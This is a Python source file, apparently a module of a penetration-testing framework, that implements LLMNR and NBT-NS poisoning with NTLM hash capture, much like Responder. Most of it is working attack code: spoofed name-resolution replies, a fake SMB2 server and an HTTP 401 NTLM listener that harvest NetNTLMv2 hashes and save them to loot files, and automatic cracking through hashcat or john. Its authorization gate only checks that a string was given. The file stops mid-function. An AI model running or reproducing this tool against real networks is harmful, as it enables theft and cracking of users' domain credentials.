"""
Active LLMNR / NBT-NS / mDNS poisoning with NTLM hash capture.

Two modes:

    passive (default)   Listen to ambient name-resolution traffic and
                        harvest hostnames, MACs, IPs. Zero packets sent.

    active (--active)   Respond to LLMNR / NBT-NS queries with our own
                        IP address, causing victims to authenticate
                        against us. Capture the NTLM Type 3 blob via an
                        SMB listener. Optionally crack the captured hash
                        with hashcat / john if they are on PATH.

The active mode is a credential-capture attack. It is exactly what
Responder does. It is trivially detected by any modern EDR. Do not run
it on a network you don't own or don't have written authorization to
test. We require the operator to pass --authorized-by "<name or
ticket-id>" before any packet is sent; the string is logged to
loot/poison_audit.log with a timestamp.

Protocols we handle:

    LLMNR   UDP/5355  multicast 224.0.0.252 / ff02::1:3
    NBT-NS  UDP/137   broadcast local segment
    mDNS    UDP/5353  multicast 224.0.0.251  (passive only)
"""

import asyncio
import base64
import os
import shutil
import socket
import struct
import subprocess
import threading
import time
from dataclasses import dataclass
from datetime import datetime, timezone
from pathlib import Path

from scapy.all import (
    Ether, IP, UDP, TCP, DNS, DNSQR, DNSRR,
    AsyncSniffer, sendp, send,
    get_if_list, get_if_hwaddr,
    conf as scapy_conf,
)

from core.output import info, success, warn, error
from net.util import PRINT_LOCK, note_error


# ---------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------

LLMNR_PORT = 5355
NBNS_PORT = 137
MDNS_PORT = 5353

LLMNR_MCAST = "224.0.0.252"
MDNS_MCAST = "224.0.0.251"
NBNS_BCAST = "255.255.255.255"

SMB_PORT = 445
HTTP_PORT = 80

# Names we will NEVER poison (too disruptive)
POISON_DENYLIST = {
    "localhost", "wpad", "isatap", "localhost.localdomain",
}

# Suffixes we will poison aggressively (Windows short-name lookups).
# Currently unused but kept as a reference for future heuristics.
POISON_AFFINITY = [
    "fileserver", "filesrv", "fileshare", "fs", "nas",
    "printer", "print", "printserver", "ps",
    "dc", "domain", "ad", "ldap",
    "sql", "db", "database",
    "backup", "bk", "archive",
    "intranet", "sharepoint", "wiki", "git", "gitlab", "svn",
    "jenkins", "ci", "build",
]


# ---------------------------------------------------------------------
# Data model
# ---------------------------------------------------------------------

@dataclass
class Capture:
    """One captured observation."""
    kind: str                       # 'llmnr-query', 'nbns-query',
                                    # 'mdns-query', 'ntlm-hash'
    ts: str
    src_ip: str = ""
    src_mac: str = ""
    src_port: int = 0
    query_name: str = ""
    query_type: str = ""
    poisoned: bool = False
    note: str = ""
    username: str = ""
    domain: str = ""
    challenge: bytes = b""
    ntlm_response: bytes = b""
    ntlmv2_hash: str = ""
    raw_ntlm_type3: bytes = b""

    def as_finding(self) -> dict:
        base = {
            "module": "poison",
            "target": self.src_ip or self.query_name,
            "evidence": self.note or self.kind,
            "data": {
                "kind": self.kind,
                "src_ip": self.src_ip,
                "src_mac": self.src_mac,
                "query_name": self.query_name,
                "poisoned": self.poisoned,
            },
        }
        if self.kind == "ntlm-hash":
            base["type"] = "ntlm_hash_captured"
            base["severity"] = "high"
            base["evidence"] = (
                f"Captured NTLMv2 hash for {self.domain}\\{self.username} "
                f"from {self.src_ip}"
            )
            base["data"].update({
                "username": self.username,
                "domain": self.domain,
                "hash": self.ntlmv2_hash,
            })
        else:
            base["type"] = "informational"
            base["severity"] = "info"
        return base


# ---------------------------------------------------------------------
# Global state
# ---------------------------------------------------------------------

class PoisonState:
    """Shared state across listeners and poison responses."""
    def __init__(self):
        self.captures: list[Capture] = []
        self.captures_lock = threading.Lock()
        self.my_ip: str = ""
        self.my_mac: str = ""
        self.iface: str = ""
        self.active: bool = False
        self.authorized_by: str = ""
        self.start_time: float = 0.0
        self.workspace = None

        # Track queries we've already poisoned (avoid re-answering)
        self.poisoned_names: set[tuple[str, str]] = set()

        # Track victims we've already captured hashes from (avoid spam)
        self.captured_from: set[str] = set()

    def record(self, cap: Capture):
        with self.captures_lock:
            self.captures.append(cap)

    def already_poisoned(self, name: str, src_ip: str) -> bool:
        return (name.lower(), src_ip) in self.poisoned_names

    def mark_poisoned(self, name: str, src_ip: str):
        self.poisoned_names.add((name.lower(), src_ip))

    def already_captured(self, src_ip: str) -> bool:
        return src_ip in self.captured_from

    def mark_captured(self, src_ip: str):
        self.captured_from.add(src_ip)


# ---------------------------------------------------------------------
# Authorization gate
# ---------------------------------------------------------------------

def _check_authorization(authorized_by: str) -> tuple[bool, str]:
    """Verify that we're allowed to send poison packets."""
    if not authorized_by or not authorized_by.strip():
        return False, "no --authorized-by value provided"
    value = authorized_by.strip()
    if len(value) < 3:
        return False, f"authorization string too short: {value!r}"
    return True, value


def _audit_log(state: "PoisonState", message: str):
    """Append a line to loot/poison_audit.log if a workspace is set."""
    if not state.workspace:
        return
    try:
        log = state.workspace.loot_dir / "poison_audit.log"
        log.parent.mkdir(parents=True, exist_ok=True)
        ts = datetime.now(timezone.utc).isoformat()
        with log.open("a", encoding="utf-8") as f:
            f.write(f"[{ts}] {message}\n")
    except Exception as e:
        warn(f"could not write audit log: {e}")


# ---------------------------------------------------------------------
# Interface / IP discovery
# ---------------------------------------------------------------------

def _pick_iface() -> tuple[str, str, str]:
    """Return (iface_name, ipv4_address, mac) for the default route."""
    # Try scapy's route table first
    try:
        route = scapy_conf.route.route("8.8.8.8")
        iface = route[0]
        ip = route[1]
        if iface and ip and ip != "0.0.0.0":
            try:
                mac = get_if_hwaddr(iface)
            except Exception:
                mac = "00:00:00:00:00:00"
            return iface, ip, mac
    except Exception:
        pass

    # Fall back to scanning interfaces
    try:
        import psutil
        for iface, addrs in psutil.net_if_addrs().items():
            ipv4 = None
            mac = None
            for addr in addrs:
                if addr.family == socket.AF_INET:
                    ipv4 = addr.address
                elif getattr(addr, "family", None) == 17:  # AF_LINK on BSD/mac
                    mac = addr.address
            if ipv4 and ipv4 != "127.0.0.1":
                if not mac:
                    try:
                        mac = get_if_hwaddr(iface)
                    except Exception:
                        mac = "00:00:00:00:00:00"
                return iface, ipv4, mac
    except ImportError:
        pass

    return "", "", ""


# ---------------------------------------------------------------------
# DNS name decoding (used by both LLMNR and mDNS)
# ---------------------------------------------------------------------

def _decode_dns_name(raw: bytes) -> str:
    """Decode a length-prefixed DNS name from raw bytes."""
    parts = []
    i = 0
    while i < len(raw):
        length = raw[i]
        if length == 0:
            break
        i += 1
        if i + length > len(raw):
            break
        try:
            parts.append(raw[i:i + length].decode("ascii", errors="replace"))
        except Exception:
            parts.append(raw[i:i + length].hex())
        i += length
    return ".".join(parts)


def _decode_nbns_name(raw: bytes) -> str:
    """Decode a NetBIOS name (RFC 1001/1002 level 1 encoding).

    Each character of the original name is split into two 4-bit
    nibbles, each offset by 0x41 ('A') to make it printable.
    """
    if not raw:
        return ""
    out = []
    # The name starts at offset 1 (offset 0 is the length byte).
    i = 1
    while i < len(raw) - 1:
        try:
            hi = (raw[i] - 0x41) << 4
            lo = (raw[i + 1] - 0x41) & 0x0F
            out.append(chr(hi | lo))
        except Exception:
            break
        i += 2
    return "".join(out).strip()


def _should_poison(name: str) -> bool:
    """Return True if this query name is worth poisoning."""
    low = name.lower().strip(".")
    if not low:
        return False
    if low in POISON_DENYLIST:
        return False
    if "." in low:
        return False
    try:
        if low == socket.gethostname().lower():
            return False
    except Exception:
        pass
    return True


# ---------------------------------------------------------------------
# LLMNR
# ---------------------------------------------------------------------

def _parse_llmnr_query(pkt) -> tuple[str, int] | None:
    """Parse an LLMNR query. Returns (name, qtype) or None."""
    if not pkt.haslayer(UDP) or pkt[UDP].dport != LLMNR_PORT:
        return None
    if not pkt.haslayer(DNS) or pkt[DNS].qr != 0:
        return None
    dns = pkt[DNS]
    if dns.qdcount < 1:
        return None
    try:
        qname_raw = bytes(dns.qd.qname)
    except Exception:
        return None
    name = _decode_dns_name(qname_raw)
    return name, dns.qd.qtype


def _build_llmnr_poison(query_pkt, our_ip: str) -> bytes | None:
    """Build an LLMNR response pointing at our IP."""
    try:
        dns = query_pkt[DNS]
        resp = (
            IP(dst=query_pkt[IP].src, src=our_ip)
            / UDP(sport=LLMNR_PORT, dport=query_pkt[UDP].sport)
            / DNS(
                id=dns.id,
                qr=1, opcode=0, aa=1, rd=1, ra=1, z=0, rcode=0,
                qdcount=1, ancount=1, nscount=0, arcount=0,
                qd=DNSQR(qname=dns.qd.qname, qtype=dns.qd.qtype,
                         qclass=1),
                an=DNSRR(
                    rrname=dns.qd.qname,
                    type=1,                # A record
                    rclass=1,              # IN
                    ttl=30,
                    rdata=our_ip,
                ),
            )
        )
        return bytes(resp)
    except Exception as e:
        note_error("llmnr_build", f"{type(e).__name__}: {e}")
        return None


def _handle_llmnr(pkt, state: PoisonState):
    """Callback for every LLMNR packet the sniffer sees."""
    parsed = _parse_llmnr_query(pkt)
    if not parsed:
        return
    name, qtype = parsed
    src_ip = pkt[IP].src
    src_mac = pkt[Ether].src if pkt.haslayer(Ether) else ""

    cap = Capture(
        kind="llmnr-query",
        ts=datetime.now(timezone.utc).isoformat(),
        src_ip=src_ip,
        src_mac=src_mac,
        src_port=pkt[UDP].sport,
        query_name=name,
        query_type=f"LLMNR/type{qtype}",
        note=f"LLMNR query from {src_ip} for {name!r}",
    )

    if state.active and _should_poison(name):
        if not state.already_poisoned(name, src_ip):
            resp = _build_llmnr_poison(pkt, state.my_ip)
            if resp:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                    sock.sendto(resp, (src_ip, pkt[UDP].sport))
                    sock.close()
                    cap.poisoned = True
                    cap.note += f" → poisoned with {state.my_ip}"
                    state.mark_poisoned(name, src_ip)
                    _audit_log(state, f"LLMNR poison: {src_ip} asked for "
                                       f"{name!r}, replied with "
                                       f"{state.my_ip}")
                except Exception as e:
                    note_error("llmnr_send", f"{type(e).__name__}: {e}")

    state.record(cap)


# ---------------------------------------------------------------------
# NBT-NS (hand-rolled parser + builder)
# ---------------------------------------------------------------------
#
# NBT-NS packet layout on UDP/137 (RFC 1002 §4.2.1):
#
#   Header (12 bytes):
#       NAME_TRN_ID     uint16
#       FLAGS           uint16
#       QDCOUNT         uint16
#       ANCOUNT         uint16
#       NSCOUNT         uint16
#       ARCOUNT         uint16
#
#   Question (query packets):
#       QNAME           34 bytes (1 length byte + 32 encoded + 1 terminator)
#       QTYPE           uint16
#       QCLASS          uint16
#
# We parse and build these by hand because scapy's NetBIOS layer has
# changed class names across versions and doesn't consistently expose
# the fields we need.

def _parse_nbns_packet(pkt):
    """Parse an NBT-NS packet from scapy's raw payload."""
    if not pkt.haslayer(UDP) or pkt[UDP].dport != NBNS_PORT:
        return None
    try:
        raw = bytes(pkt[UDP].payload)
    except Exception:
        return None
    if len(raw) < 12:
        return None

    try:
        (trn_id, flags, qd, an, ns, ar) = struct.unpack(">HHHHHH", raw[:12])
    except struct.error:
        return None

    qr = (flags >> 15) & 1
    result = {
        "id": trn_id,
        "qr": qr,
        "qname": "",
        "qtype": 0,
        "qclass": 0,
        "raw": raw,
    }

    if qr == 0 and qd >= 1 and len(raw) >= 12 + 34 + 4:
        qname_raw = raw[12:12 + 34]
        result["qname"] = _decode_nbns_name(qname_raw)
        result["qtype"], result["qclass"] = struct.unpack(
            ">HH", raw[12 + 34:12 + 34 + 4])
    return result


def _build_nbns_response(trn_id: int, qname_encoded: bytes,
                          our_ip: str) -> bytes:
    """Build an NBT-NS positive name query response pointing at our IP."""
    # Flags: QR=1, OPCODE=0, AA=1, TC=0, RD=0, RA=0, RCODE=0
    flags = 0x8400
    header = struct.pack(">HHHHHH", trn_id, flags, 0, 1, 0, 0)

    # Answer RR: NAME (34) + TYPE + CLASS + TTL + RDLENGTH + RDATA
    rr = qname_encoded[:34]
    rr += struct.pack(">HHIH", 0x0020, 0x0001, 30, 6)
    rr += struct.pack(">H", 0x0000)          # NB flags
    rr += socket.inet_aton(our_ip)

    return header + rr


def _handle_nbns(pkt, state: PoisonState):
    """Callback for every NBT-NS packet the sniffer sees."""
    parsed = _parse_nbns_packet(pkt)
    if not parsed or parsed["qr"] != 0:
        return

    name = parsed["qname"]
    if not name:
        return
    src_ip = pkt[IP].src
    src_mac = pkt[Ether].src if pkt.haslayer(Ether) else ""

    cap = Capture(
        kind="nbns-query",
        ts=datetime.now(timezone.utc).isoformat(),
        src_ip=src_ip,
        src_mac=src_mac,
        src_port=pkt[UDP].sport,
        query_name=name,
        query_type="NBT-NS",
        note=f"NBT-NS query from {src_ip} for {name!r}",
    )

    if state.active and _should_poison(name):
        if not state.already_poisoned(name, src_ip):
            qname_encoded = parsed["raw"][12:12 + 34]
            resp = _build_nbns_response(parsed["id"], qname_encoded,
                                         state.my_ip)
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                sock.sendto(resp, (src_ip, pkt[UDP].sport))
                sock.close()
                cap.poisoned = True
                cap.note += f" → poisoned with {state.my_ip}"
                state.mark_poisoned(name, src_ip)
                _audit_log(state, f"NBT-NS poison: {src_ip} asked for "
                                   f"{name!r}, replied with "
                                   f"{state.my_ip}")
            except Exception as e:
                note_error("nbns_send", f"{type(e).__name__}: {e}")

    state.record(cap)


# ---------------------------------------------------------------------
# mDNS (passive only)
# ---------------------------------------------------------------------

def _handle_mdns(pkt, state: PoisonState):
    """Passive observation of mDNS. We never respond."""
    if not pkt.haslayer(UDP) or pkt[UDP].dport != MDNS_PORT:
        return
    if not pkt.haslayer(DNS) or pkt[DNS].qr != 0:
        return
    dns = pkt[DNS]
    if dns.qdcount < 1:
        return
    try:
        name_raw = bytes(dns.qd.qname)
    except Exception:
        return
    name = _decode_dns_name(name_raw)
    if not name or name.startswith("_"):
        return
    src_ip = pkt[IP].src
    src_mac = pkt[Ether].src if pkt.haslayer(Ether) else ""

    state.record(Capture(
        kind="mdns-query",
        ts=datetime.now(timezone.utc).isoformat(),
        src_ip=src_ip,
        src_mac=src_mac,
        src_port=pkt[UDP].sport,
        query_name=name,
        query_type="mDNS",
        note=f"mDNS query from {src_ip} for {name!r}",
    ))


# ---------------------------------------------------------------------
# NTLMSSP builders + parsers
# ---------------------------------------------------------------------

def _build_ntlm_type2(server_challenge: bytes) -> bytes:
    """Build an NTLM Type 2 (CHALLENGE) message."""
    assert len(server_challenge) == 8
    target_name = b"WORKGROUP"
    header_len = 48
    target_offset = header_len + 16
    payload = target_name
    msg = (
        b"NTLMSSP\x00"
        + struct.pack("<I", 2)
        + struct.pack("<HHI", len(target_name), len(target_name),
                      target_offset)
        + struct.pack("<I", 0x00888205)
        + server_challenge
        + b"\x00" * 8
        + struct.pack("<HHI", 0, 0, 0)
        + b"\x00" * 8
        + payload
    )
    return msg


def _parse_ntlm_type3(type3: bytes, server_challenge: bytes) -> dict | None:
    """Parse an NTLM Type 3 (AUTHENTICATE) message."""
    try:
        if len(type3) < 64:
            return None
        if type3[:8] != b"NTLMSSP\x00":
            return None
        if struct.unpack("<I", type3[8:12])[0] != 3:
            return None

        def read_sec_buf(offset):
            length, _, buf_off = struct.unpack(
                "<HHI", type3[offset:offset + 8])
            return length, buf_off

        lm_len, lm_off = read_sec_buf(12)
        nt_len, nt_off = read_sec_buf(20)
        dom_len, dom_off = read_sec_buf(28)
        usr_len, usr_off = read_sec_buf(36)

        lm_resp = type3[lm_off:lm_off + lm_len]
        nt_resp = type3[nt_off:nt_off + nt_len]
        domain = type3[dom_off:dom_off + dom_len].decode(
            "utf-16-le", errors="ignore")
        username = type3[usr_off:usr_off + usr_len].decode(
            "utf-16-le", errors="ignore")

        if not username:
            return None

        if len(nt_resp) >= 16:
            nt_proof_str = nt_resp[:16]
            blob = nt_resp[16:]
            hash_str = (
                f"{username}::{domain}:"
                f"{server_challenge.hex()}:"
                f"{nt_proof_str.hex()}:"
                f"{blob.hex()}"
            )
        else:
            hash_str = (
                f"{username}::{domain}:"
                f"{lm_resp.hex()}:{nt_resp.hex()}:"
                f"{server_challenge.hex()}"
            )

        return {
            "username": username,
            "domain": domain or ".",
            "ntlm_response": nt_resp,
            "ntlmv2_hash": hash_str,
        }
    except Exception:
        return None


# ---------------------------------------------------------------------
# SMB listener — captures NTLM Type 3 auth attempts
# ---------------------------------------------------------------------

class SMBListener:
    """Minimal SMB server that captures NTLM authentication attempts."""

    def __init__(self, state: PoisonState, port=SMB_PORT, verbose=False):
        self.state = state
        self.port = port
        self.verbose = verbose
        self._server = None
        self._running = False

    def start(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.bind(("0.0.0.0", self.port))
            sock.listen(16)
            sock.settimeout(1.0)
            self._server = sock
            self._running = True
            info(f"poison: SMB listener on 0.0.0.0:{self.port}")
        except PermissionError:
            error(f"poison: cannot bind {self.port}/tcp — "
                  f"need Administrator privileges")
            return False
        except OSError as e:
            error(f"poison: cannot bind {self.port}/tcp: {e}")
            return False

        threading.Thread(target=self._accept_loop, daemon=True).start()
        return True

    def stop(self):
        self._running = False
        if self._server:
            try:
                self._server.close()
            except Exception:
                pass

    def _accept_loop(self):
        while self._running:
            try:
                client, addr = self._server.accept()
            except socket.timeout:
                continue
            except OSError:
                break
            threading.Thread(target=self._handle_client,
                             args=(client, addr), daemon=True).start()

    def _handle_client(self, client, addr):
        client.settimeout(5.0)
        try:
            self._smb_handshake(client, addr[0])
        except Exception as e:
            if self.verbose:
                info(f"poison: SMB handler error from {addr[0]}: "
                     f"{type(e).__name__}: {e}")
        finally:
            try:
                client.close()
            except Exception:
                pass

    def _smb_handshake(self, client, src_ip):
        # 1. SMB2 NEGOTIATE request
        data = self._recv_nbss(client)
        if not data or not data.startswith(b"\xfeSMB"):
            return

        # 2. SMB2 NEGOTIATE response (NTLMSSP auth)
        self._send_nbss(client, _smb2_negotiate_response())

        # 3. SESSION_SETUP request (NTLM Type 1)
        data = self._recv_nbss(client)
        if not data or not data.startswith(b"\xfeSMB"):
            return
        type1 = _extract_ntlmssp(data)
        if not type1 or type1[:8] != b"NTLMSSP\x00":
            return

        # 4. Generate challenge and send NTLM Type 2
        server_challenge = os.urandom(8)
        type2 = _build_ntlm_type2(server_challenge)
        self._send_nbss(client, _smb2_session_setup_response(type2))

        # 5. SESSION_SETUP request (NTLM Type 3)
        data = self._recv_nbss(client)
        if not data:
            return
        type3 = _extract_ntlmssp(data)
        if not type3 or type3[:8] != b"NTLMSSP\x00":
            return
        if type3[8] != 0x03:
            return

        # 6. Parse Type 3
        parsed = _parse_ntlm_type3(type3, server_challenge)
        if not parsed:
            return

        if self.state.already_captured(src_ip):
            return
        self.state.mark_captured(src_ip)

        username = parsed["username"]
        domain = parsed["domain"]
        ntlmv2 = parsed["ntlmv2_hash"]

        cap = Capture(
            kind="ntlm-hash",
            ts=datetime.now(timezone.utc).isoformat(),
            src_ip=src_ip,
            username=username,
            domain=domain,
            challenge=server_challenge,
            ntlm_response=parsed["ntlm_response"],
            ntlmv2_hash=ntlmv2,
            raw_ntlm_type3=type3,
            note=(f"Captured NTLMv2 hash for {domain}\\{username} "
                  f"from {src_ip}"),
        )
        self.state.record(cap)

        with PRINT_LOCK:
            success(f"[NTLM] {src_ip} → {domain}\\{username}")
            print(f"       {ntlmv2}")

        if self.state.workspace:
            try:
                p = self.state.workspace.hashes_path
                p.parent.mkdir(parents=True, exist_ok=True)
                with p.open("a", encoding="utf-8") as f:
                    f.write(f"# SMB {src_ip} "
                            f"{datetime.now(timezone.utc).isoformat()}\n")
                    f.write(f"{ntlmv2}\n")
            except Exception as e:
                warn(f"could not write hash file: {e}")

        self._send_nbss(client, _smb2_session_setup_failed())

    @staticmethod
    def _recv_nbss(client) -> bytes:
        try:
            header = _recv_exact(client, 4)
            if not header:
                return b""
            length = int.from_bytes(header[1:4], "big")
            return _recv_exact(client, length)
        except Exception:
            return b""

    @staticmethod
    def _send_nbss(client, payload: bytes):
        try:
            header = b"\x00" + len(payload).to_bytes(3, "big")
            client.sendall(header + payload)
        except Exception:
            pass


def _recv_exact(sock, n: int) -> bytes:
    buf = b""
    while len(buf) < n:
        chunk = sock.recv(n - len(buf))
        if not chunk:
            return b""
        buf += chunk
    return buf


def _smb2_header(command: int, status: int = 0, flags: int = 0x0001,
                  message_id: int = 0, tree_id: int = 0,
                  session_id: int = 0) -> bytes:
    return struct.pack(
        "<4sHHIHHI I Q I I Q Q",
        b"\xfeSMB", 64, 0, status, command, 0, flags, 0,
        message_id, 0, tree_id, session_id,
    ) + b"\x00" * 16


def _smb2_negotiate_response() -> bytes:
    header = _smb2_header(command=0x0000)
    body = struct.pack(
        "<HHHH I 16s I I I I H H I Q",
        65, 0x0001, 0x0202, 0, 0,
        os.urandom(16),
        0, 0, 0, 0, 0, 128, 0, 0,
    )
    sec_blob = b"\x00" * 128
    return header + body + sec_blob


def _smb2_session_setup_response(ntlm_type2: bytes) -> bytes:
    header = _smb2_header(command=0x0001, status=0xC0000016)
    body = struct.pack("<HH H I H", 9, 0, 0, 72, len(ntlm_type2))
    return header + body + ntlm_type2


def _smb2_session_setup_failed() -> bytes:
    header = _smb2_header(command=0x0001, status=0xC000006D)
    body = struct.pack("<HH H I H", 9, 0, 0, 72, 0)
    return header + body


def _extract_ntlmssp(smb2_packet: bytes) -> bytes:
    sig = b"NTLMSSP\x00"
    idx = smb2_packet.find(sig)
    if idx < 0:
        return b""
    return smb2_packet[idx:]


# ---------------------------------------------------------------------
# HTTP listener — alternative trigger for NTLM auth
# ---------------------------------------------------------------------

class HTTPListener:
    """Tiny HTTP server that returns 401 with WWW-Authenticate: NTLM."""

    _CHALLENGE = os.urandom(8)

    def __init__(self, state: PoisonState, port=HTTP_PORT, verbose=False):
        self.state = state
        self.port = port
        self.verbose = verbose
        self._server = None
        self._running = False

    def start(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.bind(("0.0.0.0", self.port))
            sock.listen(16)
            sock.settimeout(1.0)
            self._server = sock
            self._running = True
            info(f"poison: HTTP listener on 0.0.0.0:{self.port}")
        except PermissionError:
            warn(f"poison: cannot bind {self.port}/tcp — need Administrator")
            return False
        except OSError as e:
            warn(f"poison: cannot bind {self.port}/tcp: {e}")
            return False

        threading.Thread(target=self._accept_loop, daemon=True).start()
        return True

    def stop(self):
        self._running = False
        if self._server:
            try:
                self._server.close()
            except Exception:
                pass

    def _accept_loop(self):
        while self._running:
            try:
                client, addr = self._server.accept()
            except socket.timeout:
                continue
            except OSError:
                break
            threading.Thread(target=self._handle, args=(client, addr[0]),
                             daemon=True).start()

    def _handle(self, client, src_ip):
        client.settimeout(5.0)
        try:
            data = b""
            while b"\r\n\r\n" not in data:
                chunk = client.recv(4096)
                if not chunk:
                    return
                data += chunk
                if len(data) > 65536:
                    break

            auth_hdr = _find_header(data, b"Authorization")
            if auth_hdr and b"NTLM " in auth_hdr:
                b64 = auth_hdr.split(b"NTLM ", 1)[1].strip()
                try:
                    ntlm_blob = base64.b64decode(b64)
                except Exception:
                    ntlm_blob = b""
                if ntlm_blob.startswith(b"NTLMSSP\x00"):
                    type_num = struct.unpack("<I", ntlm_blob[8:12])[0]
                    if type_num == 3:
                        parsed = _parse_ntlm_type3(
                            ntlm_blob, self._CHALLENGE)
                        if parsed and not self.state.already_captured(src_ip):
                            self.state.mark_captured(src_ip)
                            cap = Capture(
                                kind="ntlm-hash",
                                ts=datetime.now(timezone.utc).isoformat(),
                                src_ip=src_ip,
                                username=parsed["username"],
                                domain=parsed["domain"],
                                challenge=self._CHALLENGE,
                                ntlm_response=parsed["ntlm_response"],
                                ntlmv2_hash=parsed["ntlmv2_hash"],
                                raw_ntlm_type3=ntlm_blob,
                                note=(f"Captured HTTP NTLMv2 hash for "
                                      f"{parsed['domain']}\\"
                                      f"{parsed['username']} from {src_ip}"),
                            )
                            self.state.record(cap)
                            with PRINT_LOCK:
                                success(f"[HTTP-NTLM] {src_ip} → "
                                        f"{parsed['domain']}\\"
                                        f"{parsed['username']}")
                                print(f"       {parsed['ntlmv2_hash']}")
                            if self.state.workspace:
                                try:
                                    p = self.state.workspace.hashes_path
                                    p.parent.mkdir(parents=True,
                                                    exist_ok=True)
                                    with p.open("a", encoding="utf-8") as f:
                                        f.write(
                                            f"# HTTP {src_ip} "
                                            f"{datetime.now(timezone.utc).isoformat()}\n"
                                        )
                                        f.write(
                                            f"{parsed['ntlmv2_hash']}\n")
                                except Exception:
                                    pass
                            return

            challenge_b64 = base64.b64encode(
                _build_ntlm_type2(self._CHALLENGE)).decode()
            response = (
                b"HTTP/1.1 401 Unauthorized\r\n"
                b"Server: Microsoft-IIS/10.0\r\n"
                b"WWW-Authenticate: NTLM\r\n"
                b"WWW-Authenticate: NTLM " + challenge_b64.encode() + b"\r\n"
                b"Content-Length: 0\r\n"
                b"Connection: close\r\n"
                b"\r\n"
            )
            client.sendall(response)
        except Exception as e:
            if self.verbose:
                info(f"poison: HTTP handler error from {src_ip}: "
                     f"{type(e).__name__}: {e}")
        finally:
            try:
                client.close()
            except Exception:
                pass


def _find_header(request: bytes, header_name: bytes) -> bytes:
    for line in request.split(b"\r\n"):
        if line.lower().startswith(header_name.lower() + b":"):
            return line.split(b":", 1)[1].strip()
    return b""


# ---------------------------------------------------------------------
# Main sniffer
# ---------------------------------------------------------------------

async def _sniff_loop(state: PoisonState, duration: float, verbose: bool):
    """Run the sniffer for `duration` seconds, dispatching packets to
    the right handler."""

    def handle(pkt):
        try:
            if not pkt.haslayer(UDP):
                return
            dport = pkt[UDP].dport
            if dport == LLMNR_PORT:
                _handle_llmnr(pkt, state)
            elif dport == NBNS_PORT:
                _handle_nbns(pkt, state)
            elif dport == MDNS_PORT:
                _handle_mdns(pkt, state)
        except Exception:
            pass

    sniffer = AsyncSniffer(
        store=False,
        prn=handle,
        filter=f"udp and (port {LLMNR_PORT} or port {NBNS_PORT} "
               f"or port {MDNS_PORT})",
    )
    try:
        sniffer.start()
    except Exception as e:
        error(f"poison: could not start sniffer: {type(e).__name__}: {e}")
        return
    try:
        await asyncio.sleep(duration)
    finally:
        try:
            sniffer.stop()
        except Exception:
            pass


# ---------------------------------------------------------------------
# Store integration
# ---------------------------------------------------------------------

def _persist(state: PoisonState, store):
    if not store:
        return

    hostnames_by_ip: dict[str, set[str]] = {}

    for cap in state.captures:
        if cap.kind == "ntlm-hash":
            store.add_finding(cap.as_finding())
            store.add_credential(
                target=cap.src_ip,
                username=cap.username,
                password=None,
                hash=cap.ntlmv2_hash,
                source="poison-ntlm",
                notes=f"domain={cap.domain}",
            )
        elif cap.kind.endswith("-query"):
            if cap.src_ip:
                hostnames_by_ip.setdefault(cap.src_ip, set()).add(
                    cap.query_name)
            store.add_finding(cap.as_finding())

    for ip, names in hostnames_by_ip.items():
        store.upsert_host(
            ip,
            hostname=next(iter(names)) if names else None,
            discovery="poison-passive" if not state.active else "poison",
            tags=[f"queried:{n}" for n in list(names)[:5]],
        )


def _crack_hashes(state: PoisonState, wordlist: str | None,
                  verbose: bool = False) -> dict:
    cracked: dict[str, str] = {}

    hashes = [c.ntlmv2_hash for c in state.captures
              if c.kind == "ntlm-hash" and c.ntlmv2_hash]
    if not hashes:
        return cracked

    if not wordlist:
        info("poison: no wordlist provided; skipping cracking")
        return cracked

    wordlist_path = Path(wordlist)
    if not wordlist_path.exists():
        warn(f"poison: wordlist not found: {wordlist}")
        return cracked

    hc = shutil.which("hashcat")
    jn = shutil.which("john")

    if hc:
        info(f"poison: cracking {len(hashes)} hash(es) with hashcat")
        tmp = (state.workspace.loot_dir / "hashes_for_crack.txt"
               if state.workspace else Path("hashes_for_crack.txt"))
        tmp.parent.mkdir(parents=True, exist_ok=True)
        tmp.write_text("\n".join(hashes), encoding="utf-8")
        try:
            subprocess.run(
                [hc, "-m", "5600", "-a", "0", str(tmp), str(wordlist_path),
                 "--potfile-path", str(tmp) + ".pot", "--quiet"],
                capture_output=True, text=True, timeout=600,
            )
        except Exception as e:
            warn(f"poison: hashcat failed: {e}")
            return cracked

        pot = Path(str(tmp) + ".pot")
        if pot.exists():
            for line in pot.read_text(encoding="utf-8").splitlines():
                if ":" in line:
                    h, _, pw = line.rpartition(":")
                    if h in hashes:
                        cracked[h] = pw
        for h in hashes:
            if h in cracked:
                success(f"[CRACKED] {h[:50]}… → {cracked[h]}")
    elif jn:
        info(f"poison: cracking {len(hashes)} hash(es) with john")
        tmp = Path("hashes_for_john.txt")
        tmp.write_text("\n".join(hashes), encoding="utf-8")
        try:
            subprocess.run(
                [jn, "--format=netntlmv2", f"--wordlist={wordlist_path}",
                 str(tmp)],
                capture_output=True, text=True, timeout=600,
            )
            show = subprocess.run(
                [jn, "--show", "--format=netntlmv2", str(tmp)],
                capture_output=True, text=True, timeout=30,
            )
            for line in show.stdout.splitlines():
                if ":" in line:
                    h, _, pw = line.rpartition(":")
                    if h in hashes:
                        cracked[h] = pw
        except Exception as e:
            warn(f"poison: john failed: {e}")
    else:
        warn("poison: no hashcat or john on PATH; skipping cracking")

    return cracked


# ---------------------------------------------------------------------
# Top-level entry point
# ---------------------------------------------------------------------

async def run(duration=60, active=False, authorized_by=None,
              interface=None, verbose=False, wordlist=None,
              store=None, workspace=None, smb_port=SMB_PORT,
              http_port=HTTP_PORT, passive_only_ok=True):
    """Run the poison capture session."""
    state = PoisonState()
    state.workspace = workspace
    state.start_time = time.time()

    if interface:
        iface = interface
        try:
            my_ip = scapy_conf.route.route("0.0.0.0")[1]
        except Exception:
            my_ip = ""
        try:
            my_mac = get_if_hwaddr(iface)
        except Exception:
            my_mac = "00:00:00:00:00:00"
    else:
        iface, my_ip, my_mac = _pick_iface()

    if not iface:
